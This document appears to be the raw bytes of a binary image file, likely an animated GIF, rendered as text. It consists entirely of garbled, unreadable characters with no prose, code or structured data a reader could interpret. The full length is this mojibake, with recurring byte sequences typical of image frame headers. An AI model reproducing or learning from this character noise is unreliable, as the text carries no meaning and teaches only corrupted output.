bE6Տ����U_ jS���b�tfn	a>�`~8j���/YSY�N&��8T�ym�[�SH��t���h�֒rg��xL�I��6���!K�œ�TK?�@9�8�6�2H�N��f�w`')r��_FJ���X�Xy�WizX)rE�r�hp�Ȇ��%��Z�b�Lo�y3L_8�H3�刌�^�vQYqMS��J~9�9Uִ��0�9��#��U���8h�GXɕ\9�Vz1�j�d��t�B������3�)ч��iqx�sh/�D�%�!%��M���h��ɇ�B��pŖy�8a��m������-�W/�W}�d���Չ�(�2���7�T�-q���i�ɚCw��b�`��m�ٙ/����uꙟ���>(d��C�3��pa���ڠ���:�Z�z�����ڡ�� �":�$Z�&z�(��*��,ڢ.��0�2:�4Z�6z�8��:��<ڣD�V�����d��I�����J��"SY�J�+��e�81�d�X�`�.��J"� �R�&��`b=�a.TJ�	��jJ$4��
FJy3?�5�E-�!C���|Z!��|?���j���G�F��.e1MD�͸�$��t95����q�3�s��}�������o�Z!���⃂�����z�Oc�B�������J �ڥ�Z �ƊC����+�ڬ́� 	��z^���
X��"�ٚ8��F��z�3���z1R���ShJ��:��y�Z�D��J��"\��,�Rn�����4�{PxBq�	���8g��RR�{#	#��Tj�� �!�[�3q�H��,uV��-[*{�1���1= �iL�$[���>;�bE��ժ�5a)=�
1�-�gL[�!�az��Q�`j0T���"b��v�C�
�'���f���8�!@�%i��p�&t{vQ�.+;O���w�+�+O �.�t��e�fAl��!2��4�IHӔ�n  !�  ,    ��  � H����*\Ȱ�Ç�#(�ň3j�ȱcGo����go�Ǔ(S�\ɲ%ˊ \ʜI�eHv���ɳ�ϟ@1��v1�ѣ5ō[���I�P�J����9q�j�
1�ȝO��K�c�u�*�];�����ʝK�`֘u�U����z�9�] q�+��5�Ő#��/����3{<��+`͠C+<7�����܉�5j�Y]�N���ٸ�^w�t���̽}��x�x�Α�l\��p}7��6�e��[�;����ࡢ���4gǬ˫
����K)���3��uj郎��������UD�dQ9�!F�pp	��I��8 ���s���; >��F��� �c�d��5WH�8�Ӈ0>�s��ω��sN8t���t1�P<���8�i6��t���wBF��?y �9�(WcQviP�4��RT&�R�C�7n���0Z��n��9�qV_��)�x��Y���� �+�ԡ�1�OZs�d�99�&�aM��(���L?Ť&h�Îa��%N9-r�>��8@�#N��VfN�[�w��0�T�JR�8u-��<�~hb�A ;�Qj]b+�٬��|ʫLI
�l��86�\ m�}�6�*�Mj���wb�ip�0�WH�
h�:�|[���)U�[Z����׹���ΛdeEp��MqC�ҧ�H��@�g|���co�%R\��(�vUD�t�`�u�2Y7�<��?�Y�!��@��L���ȧ�*�Z�(M�����`nZ��@�&kNw�E�[_�%j� XsYc�vn��b}�V7]1���&�s�ܵ=I/��b�x�1U=�U�M,XH@.�Sos��ޖ�6uOZn�����X6v�Z�=�#m��+�k` ���_�o���iF�@w�e�}��k�=��^ׯ��E����;���4[��|��G�lҜC6��d��`�E5}A3���\�*�\�G�|��Ώ��z�9'����0��j|����Ѥj�Q\�(���("�br4� �r� ] '�����,d����X�au�Qʤk	�`\x(�I�2,�9�dC��m ��LI�W�1�\����"?�$o�r����s��@��b��Q ��o��q ��ka�P��@�t� ��7.hƙ�i"�kߎ�(��*�BH�H3�r�nTj��ANɁdE-���
�723}�W6�b!��-A�M($��ї��u��ޠ�d��ȧ �H���t��ń(�b"��*�x�:"��>�c�ISȆ��Ld�L�l��u����ё#�b���m/"��>�L���;1<&"�(%\X%K�#�3��[��9�Q�HqXS�THdLyJeFE��%�$$!�B��MN�O��S"��x3Ľ�0!9!�@>i��9��FJJZfjO$
����p@6 nd��S*���H�YD)bIL]R�(A-�H�"I�	g@�5�Eu�&�,
�f{P&���Ke�*"u�H��R	b/��tI:�+/�:���T)Q��VթG�R!8�H��ˣ<qy�Q�x�K��=�"��K�Y��)�f7;Du~U&+Fr?��ֵy�ox��P��K�Q��I�#s��n�p њ�$ũ^�;�ຕ%$Ku�K��կ|-.�t�н�K��M	eb�Cě�{�zc���b����:J22�Lb�U^fY��]�V�L*�G���N�d�a��@�I["M ��N;2�R�˯|S�7��.%��~l��!�\�G�ç�@vI��P����R+�H�]�FX��oM�� %��x�;Ld"���őSL�I�&縋H�a��0��22J���w����d	��f�sܱ&�i-�i���@�&	럏�R%��={�M���ڢD��ɗ'��A�r�3�]�g"��!5o4gc�rӲI�P���
��\	k�6踼��Hi5�QҞ�Y�G�]C�?W*���u]��k��Z!���z��8Z�(q�i�
쇔�R��"�$�;�f	�S��g$��ybd5H k�%�*y.C��o�5;k�}׽�'INK$g���!��6O,f�kDN!�� r�l���8�eB�p[<"S�ZI��o�L:�V��:^~�$o�����������P�c�7b�f7�L4��mZ>��d�CG)�r���<���vA@^r=��xJ���)I��r���]��4J�Ζkr�VZ�����V&�u�7�[�]��F%U�������C�I��5"t�$@s<H;<�ۜ(�r��C�L���'����O����	�-�Ì�������^��kd��D�����:!��=F{2�Qrw�lP/����UVD���X%�k��ky��8
A�~�*�x����ה�%->��| �ㄥ�2�~�WK5�}p"~��JhN'B�WO���HtHV\�$��瀀�)w&C� Kj&��f� ��t��e*%(�	������.XB/�ɶ��-�ej�����W���.֑��ǃF�u��`V6F���s1�G"A2Z�"1����bx�`��b6m߷��x6�7�.�!$s�X�!�$�pK�u�@E}�I!�wX�LP �b�!��H`Q��x�:a���z �B�z�J�h���f����X�Ȋ��;@7GH!�����0��/�c&|HK�Q�ȋ��6wv�q�r�{�f'�e��@eaM��(�e�Sa�aQu�O� ���22�aK�X�#s��X�ҁ�[G��u�q�Ȏ�H�蘏�hK�hV�H ���# ���6	�6Ȑ�d3��x���A-�dL錿��x�%�v��c���O�De��^��0ͳ�+�T:=V508K�}T�q��d�;yXQ5&�^�+ʑ{�-�x���G��LوR���KR)::�@���M+y ckX)z�����g��o����i�{��X���֕�V��H��)e)�~�{��h(��5�0'�#�^\��J4�`K�UITUQUI��H"v_�9b�B�5����p��1�l�n���G>�g��'����"�y�������y��nF!z���	����Q�ћ�YagP�`*}1e�H�&�g֓<�'�	T�(�c����1i�y�+q������cR`iwA��&16�v'��h�ȹ�5i�y�
WZ�Jz�I�@$a�b'�D����c��Xs�*��ٟMx�١Q�5W���=�(��*��,ڢ.��0�2:�4Z�6z�8��:��<ڣ>��@�B:�DZ�Fz�H��J��LڤN��P�R:�TZ�Vz�X��Z
,��Ss���S��G�`�/�T&qK4��yKe�2g�D�ā�R0����de"e���4KX�:���aV������^��J�!j�%�H�q�'R��j��&�3�
�>�%�6.(�'��!H2�#���򋉩R��U��!f6d��B����"�Q5����=�
m�$���<լ�s�3!�К�X�JC�ꆭ���ʭ�q�
��c��Q��:��=����Ѩ�����
����U!iz������t�[�J:�+8}�����q����0�2�
����`
/Ш���:뱚��d+�R�nF��(���e{i'۲�A�4��2!A�z�2h3˳Y�|@#;;�eQ�.a�F��v#Qƴ,��P��q���S���בȧ�;�`��⩵3�n�J�?�Zb��!-�i�H���4*K>;����H�z�g�H3���~�=Q�+PU+
hw{�r������<f�<�%��s^�sP���A�A9��+P�>����-
�;�X�1  !�  ,    ��  � H����*\Ȱ�Ç�#h�8o3j�ȱ�G� B�c/�Ǔ(S�\ɲe�s�̹�I��K �ƭϤ͟@�
��9r�*]�3��s%}2�J��U��֕�	�ׯC�cד'سhӦLwt�ڷh�$+�ݻp�Q �ߥN�
����a�zw�≮�7q$	7�L9%�������9�8 �֕�L�t�uM��Rg<x�c�����
��͛�� �ؙKڻx���F��k��]{�5;��t���j�i݌}v`���_���Z�wТ%�_o��p��W���~��<3�/�5p� ��'�I�#�O��SZHx��9�8���C�P9��YH �8�Q(b���O�S��z��`L4�œw6U;��ԡ�ތE��S�6�ކ95��DFI=ڙ(�X�!�X�~��sRJi�A=�N�%(�� .f����8��%c����I���7';��Yً��a8*�9�=Б9�N`v��NkڅS9:*�oʉ` <.(N:;�yVH����)�(PW6e(!g�(F�[���*��ب�P��Y �zh�ƩjM&{�:�9)-��Y��P�
t�d8�䪦?b+ �׾��֚;!y��n�
��.{��s�R�2��@�4���ַ#�b��!�Ǘ�;;��P���;.^����u�������$��[:�DD1G)tqc�	��%O'�P˩&�@+����57'qC=k�/�����p��l@{
�Y��#��A�����hganb]3Ӝ-YtZfF-vl-�u�_�cR�vu%��kcK�D6��h�_����]�d�פ�S�_B:x��l}\gJ6��㫹Sո�Vn�d�u���SF7Q0�N��_�W��^z�tt�ۆ�{Z&�>;�>�_!փ���m8z���Cf�ve��R.�la�.����3F��C�j�8�W��Y9���h_s:4�_��a���a������\�ޱ>�A�w =d�~pR
��P�-�3��v��M�0}�J��>q��qzz
��<~p*�;�P�!��&^���W����*%
��R��'�K�|�C��J��]�a~�RM���!���*u{�w
ؒ]Ud0������E��*�q�Ap��&i�[VD	y�<Z�5m�΅��+�|F�hYL���x� �RT�db�|�/C4d�.#�$��)��` �b�J��X��h�q�F��K��Vq��YQ��X���ÂFLH�¼�R)�P!;��u�dG�	�:�S�9�t�c�o,�w��Jh��QV�(=ޡ��P�)��1��#�
�C��eA ����ɒ��Y"^&*Q�[�@F�n��+6��='��� ���B��tβ'$����ؘ>~�ɲ�#5�0u�/Ө��\F�T�z�9K�|&�-IQ�X�@er!��R��#�  >:dT;�� T��FA
��"J��n\:��Ep2�����DU��e��g1uЇ����
#t�P^a���c L��㮇V�%%
�ؘV�lq�*c�S�#�_"r`H�f�*��Ƌ���$�d�.IdM1)�.5CV���K��GB��:��EQ���Q@�ʭh�u����Q�Ġ� �o������8��Ft	b��5%�0�?a�Hy�#�]Vғ�j0T3�\	��-EC��L�k�E�/>�hY��q�L)���R��Ɉ<f̩K]�I���'��y&O:����9���E���N�!���~l�u!�J�G[�[1X +�1~V�zt��X��h�a�0�6$vtN�����~
�ނ��5��$�>�ި�?K�=h�0�� �T��	�X��v��2Qvt�������R:$E5w�Fm^���&Ęy��<2�ۙ4��sB���,�|tA�����.�t�\��I�8���gL�FR(�4CXW?#����*C~#�ؚ�&ک�A4j�o6�&m���z5oT	�]=E��9!�����=�k2���gd+��IΏ�?�pS�#�J��f��W�~�,;I�#+=wJ�
�Ē��=����&�M��7��Òs�{���5B6�
�H��I�떊�EBo�#R���&S�K������:�7�Mc�+�<�	��I�*���¼����s�<"���C:Dà��85Js�^��G��O�����]�T?��7bO�ܼ�6	�J�Ôq��aoA����F�nI�5b��dd�z��_�w��{O���s��:!H^��Cx�V�L<SZ4��0J͡�߮�k�d�2�MF���[� �lS�^z�0(`��i'���{`m�}�U��w|<���O�y�C�% �sF�-9�F��� yO!����ׇ�����a��c���R�����i�'���Ot�����7"�џ��s� 1�w\%z�H�Q��]�u$^g�HEc@FB�G�Ƕ�,�x(O
8h�G|�r�Ƕy�p�G�%(MPv����L3Z̢�g|��6�(`�`��A�u";I�nAa�$rfaMքwU�Rхu�`���%�w�a�^�,�mfHfR��jȆ9�M��Q,�b�`��d��v�uqG��Y�kd�V�����%�����<��7��}؇k8a���؈������؉�OOF�d(PȒ�3с'��?�yP襆OG0�Q���Q����� [c^yx�����,�etEq=�H>�}a�
1^�dK���؍����f��N�Mݘ��%.�������Md!.b�^#[�%D1F����S�����#c�`z�}	vMθ5�V���e|FYΨ�O�4KvX���P9�H�7Ȣ["F>�tbh�#��`ȑx'�M��:be��$k�2t���[��%�D9�F�d��j	��2'�V�8�蕒c(9R�dd�Y�M�����z^�z<!�T�����!�<�#�h�.��h�t���`����Q�� R^\	RЄ*�UҴ?ͣU������4h���,���.�^x�+�mz)y8ƕci8di1��
ad}I�c6f�I0�(���s	��mkrg��A}�����z�i�U��R�Y^��d�d�$���M���x��Ɉ��z�Y�&��q����y���R�(3Q�����IJ8�b���{_�O�����i�y����ǘ��;�s����	{�����)��ɑB8���T4N*���?��ڡ�� �":�$Z�&z�(��*��,ڢ.��0�2:�4Z�6z�8��:��<ڣ>��@�B:�DZ�Fz�H��J��L�za�٤أ�v)�5x����&��{�NVZ2&ሮB��$����!�a�(����^P�2�#g��m�'��qgX��y�%"��$9��Ue�#R- ���0�P��:"��#޷��J#UU�$�: �dR�yՙ���0(�&����Vҷ&��* �҆SR�:!�ګ�������*6�z��Q*����* )Ȧ�*"g�ZRպ)�.����q��D^��
�����:l��S��/����T��zZJ����!���r�q��*��q�Q�6q��ۣ�Bk.�Rn������ꚱp��:w �AB�!�s�%K$���r�.��J�1��
�5;0��@��J���B�o�q^(�C+pG��wq��1�L;���^�hL��xI��G�?��a�-�o!-e{�%����f�"+M/���D3�d�o۴FC�
�'�"}n��L!-���cu��0���˱��s��DZj���W��������N[3.M4�{��{�̓V�1^�kvh22�  !�  ,    ��  � H����*\Ȱ�Çڳw�@ 3j�ȱ�Ǐ'�I��ɓ(Sn�H�^:q*cʜ�R$͛8s�܉p�={��a�I��Lpm]ʴ�Ӂ'�[7n�ӫX�����ׯ)ڛ
���xͪ][�kTx���]�6 ׹x��:��޿3͡���a�����{���q���#츲�?��w�sDq����L�2ߩ�`�^�p�`ְ�e���s��ޭ�^>����}n���ȳ��-9�qƏ;�^T*U��=�;G�u��:������es�Қ_?��� Vg
g�r(t���>��������O<���8�8���`']�:<���L��N��y#N8l�we��Pw�pFL��^�̧�8�D��]�M.�h�8�3W:u�$Af�S<�Ѷ�v-ie �C�M�U6N:M)�;�EՌ1A�XquY�:���#�	n(A$�;��'�X59�Lh!��;?��"������f��}�N�S
�(}��ua���tW�6�[ ��	������6��@��	�}�@ʖ���χ⠉9�%�Bͥi��Ź��'��]稚�8�0hY�1K�{7a$)���%d�B�չ�zK�=���LۉF��y#X�r�x��敫�uY����j �<�H��+S�wQj����� ��sP���}��jع�Qe�W�0����,���3���^z��]  n(�l��:u =�%�7�\X�Y�|��B��=���R8��I��fյ�9�E�CO��u���k;/ٞ��k�e���, �Mwi-��d�Rmجac��9�^��4m��;�:���FK��Ty��A�i��ja��ў�fy<Yn�E�՗p�^P���.�D7f����W�;y(��+
X�Ƴ�OwR�*�����\�Hy���S+Q�
�����\P���x�4��q����ɟ���Q�[�9,����fo�+�T�a��L�m�CJ�̲:,��+L [^����m &3̸r�A��z&�����A�T0"[ �Ŀ�es<�@�T;(�c�s��m8{|ρGc�������z�qR3�H* ?���.�s|c���
�q/@4
w�(B�c�gT�bH�p � �p�vZ��&ƑG@��I(�}��$Yi�+��KKΑ�Dn�uM�Qn�ĵ\ш��%�<���X)�C�b���t���*�ҽQ�.M�L��Ďd(>�7|�p,�\�쏈�ב+V$A�
m�#B%�4��-").�Z�8ǹ�r�#.���@��9_"�BxZ�ٕN"�Wn��@�a�Ƃ���p;,�1j,,�Ѕt��t4��(D��"4�r��I1��kҳ&��I��* O�	RûL�J�K�A��-�1�9��AIbZ˝81R j�Q��0�7��.wI�,��l�@*N�Jv�г��}���ERG�9���>/s��.ʓ�$�.c9iB�B��1U������1s$"2f�?�p�8��Yd"3�+��@̦���C�o�Xe����;�M�I?�U����#�Mͪ6��(N:0����p�7���d��4��(��8@ҒĞ��I��L�AN���@{.�&�\�q����e"��!A�X��7*݌^i���҄,#��7���"�W[�
� ���7s�=�t�̹�A��A�)���vO1JsM���-�	vۈ.DJ�|.%`#rU�ylN�$ى���S1�I�A�tD��-��|�r#����5�A���R�i;/����i�j9%zp�w��D��	��3~<�0�Or�z�y*\�"U���TZ-2@�:�S��0D�:�S�2A�S2!���-!*Q�(�D*�NcڒxHz�q5�V<��xХ��f�1��:��
e,��V��YZl� 
j���Q��2��V����"p¿���T��^��[kB˴�ᘙ?ҝa���{�TF�/���1)٧7B��H�!���X����(�9)G:�hpo�r�uk��I��E6�5��T���:�ów��͐]W	�-̋���L�7^��q�p�p�$_�W��͕:��I�Q1ŵ�$���<�ɹ,������䞖���M�7	!Ϩ��n�F�&����m��� ����'����i����u�$�;9��i7d�p�T��sd�X��d����z��6I�A���\#qW��m��w����O���=� (S��9��� ��oR��0~$������\3��<	�[?����c���[�R]/�)ng���B������r|_
���|uR�'�{����N�<i^6F�����ox� G���3����NJ��.�pR�a�x�k�����
ߝlg"�6�A�g�A��|L�~yW}7aGh���S�@|!)��S8Uk�:�96tb-$wr�t|W�j��@����$��xF�)�-X�~?(�ҁ�t|��h%�N4�"B�7��B۷V	�u{',��Y�E�Qt��E+�ltW�')`82H��݁E�n�'�Vs�W#F�
W8d�0�P����R���.�W����S!�x���j!8p��=��2���
R���mah%XE;;�m�z\�z(�G��<��;�q�c�s�H!'G�D�8JX�3*�Ax���x�Ç�$�5�X�\+&1���:�$M���c$ ��@m9�5�(���,���A2�HM�@�,?!#E[�11z�x&�xh�f�"�W�BW	9��*�t���@�݈ ���y��,�wO��q� {A$�r��1^Hn��x!8KU����|#�T��[�8	\�6�� *��hy�SWS%��f7��Q�:R�Sy�N��M��TٕKٕ��$��z�6T9��Ui<y�'���l�:(�[=)��ei
�"bhEh6m���GL�	��N�L��'KSD҃ߕ��j���W\�fo�U��Y%�����j���[!��^�c��xٔ9���a�'r��K�b��$s S���gؖ%�V�S>$l��Y�C�pd��DP���Y(�6i�3��2�S��9]��Z�D_\v��i��|�]���|ę �I�����z����0@�����:�33�J�t��Ymӹ�+U�?�S�ȕ�ɗz)�jRڴR�9)�C;�a�.���G�D�f3^4Zs�"]cCK��gt6�q��~@��*��HJ�L
�l�� Z�Rڟ��f�Fo���� >�4�L�:
!�]�PV(�)�� Y.�-J� z�"���	�yٕu	�P��\����{jU��R���XR�j����yj�BF[KJ�WzPLZ?�Z�@٩ꓠ�RG
�!x�t�����$��*SX4�>�Z�U_<H+�&/�eR�ŗ�]��[���3��M�椶��̪R��[Ъ�`y�{ʧh�/�r���sɭq��xy���Rx���V�	U^�P�i���Z�
e��z��������:�����V�v[�۔T3�F�jB$�(rpY��:�E�s��@���J�r�K�&���f��'�n?��,[��i�9����3[� �j�8{�:��<��>��_)�v9�#S��1�:���"-�C�Ux�~Z�km��1��[��ʗ克gB$@�SK����Vj��k����O��Y��S�Q����6v�A7p��|{~d&o�#l�~v3Ue[�	$��X�ᣏ��s!osau�����2g��E��
���kK
e�w����[5�F��M�:��+�
Ѩ��P�ʻ�t�#�E�ꁿ"��+'>i���>Tm�Į� P�4�K�ϫ;�������'��dx�!����B[�K��&����5U�	��˾��/��g�Iz�rʿ���z��[��{���"w���:�+����V�<�gt!�������K^#\W=�����3Y2Z� �S��jz�=b�*,4�;�uF?�ۃ5�n�����ds��!�{Uɋ�$�%�k�<´yZ��K���2�#C�R�+0�y����Z��rgkzd%��'��h�-5�#t��q�*A\^l�Gf�w�,�I�W��5�*1^��\�2�Y�1����Q�ܷ���r��+�ɒ<5%Ȗ�h���h�{��za�J���Ǔ
�|9��,���>���W�)˿�˘�i��g<��^X�d���84X�*{8�ӱ�a!�C�s�S�*�΁"�IZjR�,�^���;�Z��/��2̤"��'��Lż�
��T	�ת�+8�����p�E>�x�ϼ����̫	��B��d��˹�L��w��izl���TP�7����]d�Ϳe��������)���[�#�ULӻq�'�[�w�#Ao>]�(�d핼��G����q�A��W(O=L��'��U�����Y��e�u��V�y��c�[���T�B���=�ְ��ȰZ��{�Yꃼ��ץQ��#�w��r�ƈ�Kv������5Uqլ�͓��y�|M��y١�E�s�������b�ڗA��k�ٶ��m�j��N��g��]T���Ssq�bp�ۗ]��}|Ֆ�=�R����������s��{"PuO�Sg$!��}Bg1b��R�
��g��|���9<�����j�bI�O����-���ݤ��j����ͫ���q�_�2Z�U����M�ݽ9����|�z�"~���;�1�[>��
�3*�/n�]җR�@nS0��ގ��=��1lg�Eg��[�K���ͣ�E�<��D��E���+���W�S���]o7ng�݂p��f~�4�D
���M�
�Ԋ%�
��\��t��ng���V�x~~�1�ʃ^1��n�����w�9����!��n�����wnS;�ù�:�{�N}�^�D���	�0����.�<��ݼ<�Un���T�l���������*��L���;N��V(��tv���!.��]p:2��k����Q��n�<>ú�1�]�}��O����{齋u�䮯�,��~����%Q���n����s��r��r���~ާ����.��r1Ƶ5��>U��.��%��cL��N�"0��۽�Z��������+o�=�j�[E�odE���][FBM?�H  !�  ,    ��  � H����*\Ȱ�Ç�[7.�ŋ3j��q�u�:�I��ɓ(9Ƌw.�˗0cʜI��͛����3���@�
�0ѣH�;2�ӧP�J��;�X�j���'Ȯ`�Ҥ�N�Y� ĝ�w��ێW��� m:�s��E�r�߅ �1�K8o�	�/^�Đ#K�j����N�0��p�sq;��t�޴K�^� �u�ң��vL{�l��Z�o��u��	�g��)��G�s��b�#7���L5?�nq�:�0׺��: ���G|�n8��nǙG\�����?H/��sǹ��Jo��}Sa��~d; �c�KⰣ�Y�qf�`
2�[�SJ��c�=e��V���a�e��u/yc�;xMh�:f_Z)��^�sx���Z�(<)���WB�<��@>��;Yڧ<V�; �3bJ�X��^��a� �f�z��S^J�0��wm1�{�my�o�0�/q8�J鬙�� �ࡶY�$�.����b�4hV �s)�����J���a�mM�ԥTc�j=l���Ljh��9U8��jZs��C�.}��`�&��eƮ[��cΞ0i��a��m�Ֆ[RS�b))J]�zV�F������'YeO~�*�|M�ĕj�Nv��D�>��h�O�[pd�RDz�
�9���Oƪ�&�՜=�5N<�B�:�|ىj��(�g����ZQ+sax�#+�$1	�Y�a��L;�=�]��s9�q�X'Ds�(�Ô�H�hd�d+tω<�4`^�TX��e�|��%I �y�#���������$�ѝU�e"jŵ�a�3rM�
D�X?Q�ˌ�u��=��N�H��/W6f����
$�O�	d{�je��[1f��,�=u�gg�[X�b�Y�};X[��Rp�--�[�||Xd�I����d��;Gv{]PH�������{�D��d<Wk��{��KwM�[����G���& ���e��#�T�f,;@zS�I%�}�$�{���Bv�G��9R�>% a�	'�6c�P �{Y 8��, ���c��B�-���Sޱ-s-.*hRbThSĝ\��Y�	��
�Q�IA���1���q�Q�1� :$�����2Ƃ�|�9"o�Ǜ�cr���C�$��tIC�G8��t�Vo�#QJx520ub]6	����m��@ʲx�锦4e����t��=�0��ɐ'ł�T�)I�^�r) "Hc�d���dtu-Ah �O'i����%pDIZsɿ��m��WHN�x�hZ���H3�y�`I�M�1$��b��/Z�4��&dx�Kr�RTHHxD����#�ai���e�,!i����$e17ha���Ŝ� ���J��S��"Nd�v�@���S_�5���� *R��#m3$���F��(��
��'K�Bآ����#N*�N�QǄ�Quiɬ���$+4��
��h��A�C�Sϟx�%�8s�z��r�p�e/�Q�`O��е�����e�z�����Xn'�����Tj�}�HKV�Jr�t�h	q�#���yg u�����`�D�Q�-)}��#�6Q��H[Z�XjN��t�9��>S L�+\m)�H��s<�!�(Z�l��͚�:�j%6��)W������zS��3���m�MN4�Xƒ�a-SQ�R��T\r+I�P���<��U�V�Ĳ�|���y��ޤwMY�ArS�T���,�v���p��6����xa��ñA�A�y����=qR>��:"�s����*�Q�d1=��K���%ĥ\��@x<�$�!'ZPi(h�Y��<q�:
2煠+�A��:�:�!�F�"F!O�
g�pW�N�r�|{��i�`M K���$�ˡ�W�,Z�9�S��w�Y���H@
hL�$[@��9�\l)�)I����� 7D�5�QYhCfWg���C�|���C3�
��蹘]�d�����K�#�k��\�� �;GG�Rg5���9�ڤm���}[$�#�H��k�0�%+�`��m:��<e鰢
>��������T�H6[z�V������H�x���=���9����B��i1��!��Jf%�S�����6M�s�G������@+z�1�������\$�r��n�9"';9L7s��s��9��/�0�cH�����$?,�:��.����>sY����:)xR����k g%�`l�w��CO���B苈�)!!��a*s'>9No��CD��/��A�Q�~���&�=Fb�{}�o�;{-2Y^׽�n�}A&<�H��b�6�q���D�§,��
��P�!澉`�����������!�GJr�(��H�5�k����
'�a�O�$9�!�_�t���r���r��r{��wK ���g��60�wm:g���A{��gu(�Ex(Lc�X8��HI�r�+KvM��u�g�2��1���g��.�y��>�cwm���wр7����[!A7�݆����	 �@&BB�1;WJV�P�t�e~/��g	7��Q*��A0�x3���1�!>z ��b+,�M�Ӂ�"(��~@ex'Huq�u}��,�f&F��1Q?ch�Xq�V.��uBIA�M��x8�����p�#�${
�-Ƣ�� EL�%e��w��s6e�/�'�'9+1_�F��t��^%��V�C"�H���sW�,3Q��_�r��D(�6S�)˅�!4f=��_�O�bP�r{�g�jB8�%�YV����f�s�Hߘ"J��&كhF�Y��S�+�-+A	 &e��(�pe�\�������f��8�)��6��X��Y�1L	i��iځ��l	��St��(�QtF�X� L� Vi�ED��w��|��k'q4�d���aF#�(�A���3zK+�&��?�N�Ҹp�3�H)L<�+�G ��N��A�*��f�t�T�aYU'�_��M1W	�O�Q�9N�J�����&��Z�U�����Y�B��)��Y�9��
ل����y���?	�)��:�%�-�Q_�f��!�a�Y�S����Y�jI�����i�Hg7ys+��y��7b��d�rfzv��Id@0͙�%�{���x BU*=j
5��-�������
�*�
zA���3�5�8^��H����9�$�Ux�?�Ȟ�I������P�\NV�2�&��by|��3I�xvWzV_%�6�/)1�Q0*N�Ai�@�U�e9��Z�����/���dN��J�5��J8�b�x�s0��rnJbͤ(�Qe�Aڣ;jb|�C�b�i!�~:�a�9A�A�"��zz��ר��a8��WJbiv��Jb��gIj7��z��:b��M֜���wY�יp�&�G���Gj��r0�S��ʨ#���1
��
����&�	)�+�+׆�̷�䉖�f�J���-؛&q����I��*��x���S�D ���P&b�Ll'��D ���NX�D7���L��h%� %*���q˯>
�Ț�C���ְ+����ã���ٖ^��&��ZӜ�ڔ
�qW��D�HgK�)9�uJ�9�8��3��{v�	Q��j��k���>�v�@�Ę���M�[F+�퓢�V�_j���@��Sg��i�5�[�Oy�^+3:>�j��*m˶
j��Qը���M�!��SD;d$�D�iMQtL�Mr2	���gK��%�s'���a:L��$vg�ʸL�P�ٝM�eҷ!��_��z�u����ړpK�\k������dw+���v��a���!cSU�J:*��+�����պ�g�%���j���p��Q��K��P��L�+��!eZ���Pa��[�+�3��[E����0[����b��m�P��:��h�������[�Fs��Y�M��p�{�z^����k����񶙙mk'9ѻ���N\�&,¨�m�E��tL9�G9*��;w!â1_���(�h�K��l)�fr�����������烽m���w"��h�v���
�p�2ɂ����� lL�/�W����r,$��:6>���3����Ǉ��z�l���w��U"Ɩ�:�h��Ajv<SŘl&H	��W��Z�4gȟ�*���v��/��[�P�������y�,$�۾3��]�ˇ�����Tk�����|�6��������(��J��\��sx��+���l������D����$�̞|Ι,�.�LL2��A��/��ˌ϶��P����%Q�4��A������C<�
=pk���,�k8ѣ�˸�^��o������|?�Ĕd�&��ǭ+�*�ѿ����1e�2�I��,�6���Ι��N��N��_��O��,���ԁ�TkO�Ե�f�0/���J,�A�v�a�!mՉA�U}��N�? j$�q�f�������.��2U
u�s�����dЦ3����#�)Ɂ}Ӫ闞&�،�QĐĈA�����b%����n4�"��xrJ|EG��M �Yemډq]I-%dΤY�K�)-ۘa��i�t���{�4�����,�OiS�v��%���iq���a�NI�9e�d܇����!,%f f���P�m�rk��Jj�J�S���l��6��)���-]���=�g��bB���4�Q� n�
��:>D��W�܂[�n�M��ObN������+�ܷ`?i�!>��L��V7�&�⾁��MN>�N�yN]���4��u�)�ݹ�&��A~騚�;��H�*����3�����xqD n吡�1��?^����
涡�2��_���Y�M�itޢp�<k�{��y� 3ku:���@��{腎'˶�i��1��^�.�U�>��� !�  ,    ��  � H����*\Ȱ�Ç�o�9q  D�ȱ�Ǐ Czw^ȓ(S�\ɲe�x�.ftI��M�$�Żɳ�ϟ@7�dgΛƠH��7nݻ�J�J�Jua�x�.b�ʵ�C���M�J��ٔX׍�z�-�s�º�K�����,b<j��O��t�LXj<w�^\�UƐ#��7�ř�3�<�N��Ϡ=7s������5�yךvM��c{�X��=�^E����F.�X����<gnv����~����x�2��9w0us���b���Cs�jO|��<c��)L����7q�|p6i$N ��gX�מ����Qε�Q9�
X�9��sO��d�^� �|N]���[�,v$�v!��8�h�M_$�#�D���AY���8&��9���V:���B�s^�2���IG^D`	����
YSF`�C�f�X�q_�)Ћ�ݔQS��ff�s�\����n���J�`FpaE�f�h߂��������IXf�W�[�����G�� Vj) ���<���"�����!;��z��tgd��Ni[��#��6�O �3b�7�#ΰ%jQ�V�X�-��l�3�(Ю����8p�+���a�(1�N �x�����.�Ѻm��`��g�Y�'X�ޛ�=��)���X��JV�I�n�Z�#wO��@� }�'�b�C�]9�qz#�$����=g�s
x�9��,+�>`߿��䭑���{�~Ҍ��X����*�,O�.8{~$����(P:}Y��X�F��N���@S3x�1EQ��m��b?}���d|�tb]F�m���.�� �v]Ž%��.�X���0JB��<�����œ[A�@��ݢ}�E��𔃺O�L|W���ui���w��l��L*��f�49�9e8C�]����z� ��7��?>�F�3=��aG}c���mf�z>�������
�o�3K��G����}4q�}bB����v)N�
(��%UP�� �� P*ߣ a��ѽIy���S��,M��@��w	n3�\`^��}0$���$¹@���	�w��-&Z���\�D�`�{@1�@��5��I �KS�XE��j�.A�kj�C��.Z� ^颹���6������9*g3j���Q9$:��~LJLF$�զ(R��Y�^��	#�E�3�QfH%�R�r��zD:�#��Dip��(�rS
2$��o�H�DK�L�gY�+��mC+H�79B��<�U�)�gЁ�<����n��#�{`ĖIp�#�c4�B�.FEr$�;�3�=mB\��>gr�ʄp�G�|����N+��*W+�y�D������"��8��_��y�hDI��x4���&C*j�i�U���ҧBd9��L}���&,�!�8���#e���BԎ
